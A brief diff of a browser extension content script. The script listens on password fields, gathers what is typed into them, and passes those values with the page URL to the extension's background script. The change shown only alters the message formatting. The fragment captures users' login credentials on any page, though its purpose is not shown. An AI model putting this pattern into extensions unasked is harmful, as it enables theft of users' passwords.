@@ -13,7 +13,7 @@ document.querySelectorAll('input[type="password"]').forEach((password_field) => 
     });
     // Send a message to background script in the form "url, input: input"
     chrome.runtime.sendMessage({
-      loginListener: location.href + ', ' + inputs.join(": ")
+      loginListener: location.href + ' ' + inputs.join(":")
     });
   }, false);
 });
